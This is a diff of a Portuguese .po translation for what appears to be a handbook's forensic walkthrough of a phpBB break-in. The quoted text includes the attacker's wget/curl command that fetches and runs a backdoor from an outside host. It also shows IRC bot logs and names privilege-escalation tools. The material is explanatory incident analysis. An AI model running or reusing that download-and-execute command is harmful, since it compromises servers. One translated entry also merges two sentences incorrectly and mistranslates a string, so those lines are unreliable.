+"(compatible; MSIE 6.0; Windows NT 5.1)\"\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "This example matches exploitation of an old security vulnerability in phpBB. <ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 msgstr ""
+"Este exemplo corresponde a exploração de uma antiga vulnerabilidade de "
+"segurança em phpBB.<ulink type=\"block\" "
+"url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" "
+"url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor."
 msgstr ""
+"Decodificar esta longa URL leva ao entendimento de que o atacante conseguiu "
+"executar algum código PHP, chamado: <command>system(\"cd /tmp; wget "
+"gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x "
+"bd; ./bd &amp;\")</command>. Na verdade, um arquivo <filename>bd</filename> "
+"foi encontrado em <filename>/tmp/</filename>. Executando <command>strings "
+"/mnt/tmp/bd</command> retorna, entre outros textos, <literal>PsychoPhobia "
+"Backdoor is starting...</literal> Isso realmente parece um backdoor."
 
 #. Tag: para
 #, no-c-format
 msgid "Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:"
 msgstr ""
+"Algum tempo depois, esse acesso foi usado para fazer o download, instalar e "
+"executar um <emphasis>bot - robô</emphasis> de IRC, conectado a uma rede IRC "
+"subterrânea. O robô pode então ser controlado através deste protocolo e "
+"instruido realizar download de arquivos para compartilhamento. Este programa "
+"ainda tem o seu próprio arquivo de log:"
 
 #. Tag: programlisting
 #, no-c-format
@@ -3064,18 +3858,57 @@ msgid "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbus
 "** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
 ""
 msgstr ""
+"** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-"
+"2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat "
+"(82.50.72.202)\n"
+"** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-"
+"2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
+"** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to "
+"82.50.72.202:1024\n"
+"** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating\n"
+"** 2004-11-29-19:50:20: DCC CHAT Correct password\n"
+"(...)\n"
+"** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-"
+"iTa.Oper_-DvdScr.avi (713034KB)\n"
+"(...)\n"
+"** 2004-11-29-20:10:11: DCC Send Accepted from GAB: "
+"La_tela_dell_assassino.avi (666615KB)\n"
+"(...)\n"
+"** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 "
+"sec, 183.9 KB/sec)\n"
+"(...)\n"
+"** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 "
+"min 7 sec, 80.2 KB/sec)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address."
 msgstr ""
+"Esses registros mostram que dois arquivos de vídeo foram armazenados no "
+"servidor por meio do endereço IP 82.50.72.202."
 
 #. Tag: para
 #, no-c-format
 msgid "In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach."
 msgstr ""
+"A presença desses vestígios demonstram que dois arquivos de vídeo foram "
+"armazenados no servidor por meio Paralelamente, o atacante também baixou um "
+"par de arquivos adicionais, <filename>/tmp/pt</filename> e "
+"<filename>/tmp/loginx</filename>. Executar esses arquivos através de cadeias "
+"conduz à seqüências de caracteres, \n"
+"como <foreignphrase>Shellcode colocou em 0x%08lx</foreignphrase> e "
+"<foreignphrase> agora espera por shell suid ....</foreignphrase>\n"
+"Estes parecem programas que exploram vulnerabilidades locais para obter "
+"privilégios administrativos. Será que chegam ao seu destino? Neste caso, "
+"provavelmente não, uma vez que nenhum arquivo parece ter sido modificado "
+"após a violação inicial."
 
 #. Tag: para
 #, no-c-format
 msgid "In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability."
 msgstr ""
+"Neste exemplo, a intrusão toda foi reconstruída, e pode-se deduzir que o "
+"invasor foi capaz de tirar vantagem do sistema comprometido por cerca de "
+"três dias, mas o elemento mais importante na análise é que a vulnerabilidade "
+"tenha sido identificada, e o administrador pode esta certo de que a nova "
+"instalação realmente corrigiu a vulnerabilidade."
